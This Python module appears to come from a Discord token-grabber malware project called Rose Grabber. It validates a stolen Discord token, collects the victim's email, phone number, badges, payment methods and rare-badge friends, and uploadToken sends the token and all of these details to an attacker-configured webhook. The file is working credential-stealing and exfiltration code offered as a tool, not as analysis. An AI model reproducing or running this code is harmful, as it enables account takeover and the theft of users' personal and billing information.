from json import loads, dumps
from urllib.request import Request, urlopen
from bin.config import Config
cc = Config()
from bin.ipinf import Info
ifx = Info()
from datetime import datetime

class DiscordX(): #Updating soon
    def __init__(self):
        self.webhook = cc.get_webhook()
        if cc.get_debug_mode:
            print("Discord Init")

    @staticmethod
    def GetUHQFriends(token):
        badgeList = [
            {
                "Name": "Early_Verified_Bot_Developer",
                "Value": 131072,
                "Emoji": "<:developer:874750808472825986> ",
            },
            {
                "Name": "Bug_Hunter_Level_2",
                "Value": 16384,
                "Emoji": "<:bughunter_2:874750808430874664> ",
            },
            {
                "Name": "Early_Supporter",
                "Value": 512,
                "Emoji": "<:early_supporter:874750808414113823> ",
            },
            {
                "Name": "House_Balance",
                "Value": 256,
                "Emoji": "<:balance:874750808267292683> ",
            },
            {
                "Name": "House_Brilliance",
                "Value": 128,
                "Emoji": "<:brilliance:874750808338608199> ",
            },
            {
                "Name": "House_Bravery",
                "Value": 64,
                "Emoji": "<:bravery:874750808388952075> ",
            },
            {
                "Name": "Bug_Hunter_Level_1",
                "Value": 8,
                "Emoji": "<:bughunter_1:874750808426692658> ",
            },
            {
                "Name": "HypeSquad_Events",
                "Value": 4,
                "Emoji": "<:hypesquad_events:874750808594477056> ",
            },
            {
                "Name": "Partnered_Server_Owner",
                "Value": 2,
                "Emoji": "<:partner:874750808678354964> ",
            },
            {
                "Name": "Discord_Employee",
                "Value": 1,
                "Emoji": "<:staff:874750808728666152> ",
            },
        ]
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            friendlist = loads(
                urlopen(
                    Request(
                        "https://discord.com/api/v6/users/@me/relationships",
                        headers=headers,
                    )).read().decode())
        except Exception:
            return False

        uhqlist = ""
        for friend in friendlist:
            OwnedBadges = ""
            flags = friend["user"]["public_flags"]
            for badge in badgeList:
                if flags // badge["Value"] != 0 and friend["type"] == 1:
                    if "House" not in badge["Name"]:
                        OwnedBadges += badge["Emoji"]
                    flags = flags % badge["Value"]
            if OwnedBadges != "":
                uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
        return uhqlist


    @staticmethod
    def GetBilling(token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            billingjson = loads(
                urlopen(
                    Request(
                        "https://discord.com/api/users/@me/billing/payment-sources",
                        headers=headers,
                    )).read().decode())
        except Exception:
            return False

        if billingjson == []:
            return "`None`"

        billing = ""
        for methode in billingjson:
            if methode["invalid"] is False:
                if methode["type"] == 1:
                    billing += "<:credit_card:1151916484176654416>"
                elif methode["type"] == 2:
                    billing += "<:paypal:1151916071092244520> "

        return billing


    @staticmethod
    def GetBadge(flags):
        if flags == 0:
            return ""

        OwnedBadges = ""
        badgeList = [
            {
                "Name": "Early_Verified_Bot_Developer",
                "Value": 131072,
                "Emoji": "<:developer:874750808472825986> ",
            },
            {
                "Name": "Bug_Hunter_Level_2",
                "Value": 16384,
                "Emoji": "<:bughunter_2:874750808430874664> ",
            },
            {
                "Name": "Early_Supporter",
                "Value": 512,
                "Emoji": "<:early_supporter:874750808414113823> ",
            },
            {
                "Name": "House_Balance",
                "Value": 256,
                "Emoji": "<:balance:874750808267292683> ",
            },
            {
                "Name": "House_Brilliance",
                "Value": 128,
                "Emoji": "<:brilliance:874750808338608199> ",
            },
            {
                "Name": "House_Bravery",
                "Value": 64,
                "Emoji": "<:bravery:874750808388952075> ",
            },
            {
                "Name": "Bug_Hunter_Level_1",
                "Value": 8,
                "Emoji": "<:bughunter_1:874750808426692658> ",
            },
            {
                "Name": "HypeSquad_Events",
                "Value": 4,
                "Emoji": "<:hypesquad_events:874750808594477056> ",
            },
            {
                "Name": "Partnered_Server_Owner",
                "Value": 2,
                "Emoji": "<:partner:874750808678354964> ",
            },
            {
                "Name": "Discord_Employee",
                "Value": 1,
                "Emoji": "<:staff:874750808728666152> ",
            },
        ]
        for badge in badgeList:
            if flags // badge["Value"] != 0:
                OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]

        return OwnedBadges


    @staticmethod
    def GetTokenInfo(token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }

        userjson = loads(
            urlopen(
                Request("https://discordapp.com/api/v6/users/@me",
                        headers=headers)).read().decode())
        username = userjson["username"]
        hashtag = userjson["discriminator"]
        email = userjson["email"]
        idd = userjson["id"]
        pfp = userjson["avatar"]
        flags = userjson["public_flags"]
        nitro = ""
        phone = "-"

        if "premium_type" in userjson:
            nitrot = userjson["premium_type"]
            if nitrot == 1:
                nitro = "<:classic:896119171019067423> "
            elif nitrot == 2:
                nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
        if "phone" in userjson:
            phone = userjson["phone"]

        return username, hashtag, email, idd, pfp, flags, nitro, phone


    @staticmethod
    def checkToken(token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            urlopen(
                Request("https://discordapp.com/api/v6/users/@me",
                        headers=headers))
            return True
        except Exception:
            return False


    def uploadToken(self, token):
        global hook
        headers = {
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)

        if pfp is None:
            pfp = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/assets/dogg.png"
        else:
            pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

        billing = self.GetBilling(token)
        badge = self.GetBadge(flags)
        friends = self.GetUHQFriends(token)
        if friends == "":
            friends = "`None`"
        if not billing:
            badge, phone, billing = "None", "None", "None"
        if nitro == "" and badge == "":
            nitro = "`None`"

        current_time_iso = datetime.now().isoformat()
        data = {
            "content":
            "",
            "embeds": [{
                "title":
                "Rose Report",
                "description":
                "Rose Instance - Token Information",
                "color":
                cc.get_color(),
                "fields": [
                    {
                        "name": "Token:",
                        "value": f"||`{token}`||",
                        "inline": False,
                    },
                    {
                        "name": "Email:",
                        "value": f"`{email}`",
                        "inline": False,
                    },
                    {
                        "name": "Phone:",
                        "value": f"`{phone}`",
                        "inline": False,
                    },
                    {
                        "name": "Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": False,
                    },
                    {
                        "name": "Billing:",
                        "value": f"{billing}",
                        "inline": False,
                    },
                    {
                        "name": "Friends:",
                        "value": f"{friends}",
                        "inline": False,
                    },
                ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}",
                },
                "footer": {
                    "text": cc.get_footer(),
                    "icon_url": cc.get_avatar(),
                },
                "thumbnail": {
                    "url": f"{pfp}"
                },
                "timestamp": current_time_iso,
            }],
            "avatar_url":
            cc.wh_avatar,
            "username":
            cc.wh_name,
            "attachments": [],
        }
        urlopen(Request(self.webhook, data=dumps(data).encode(), headers=headers))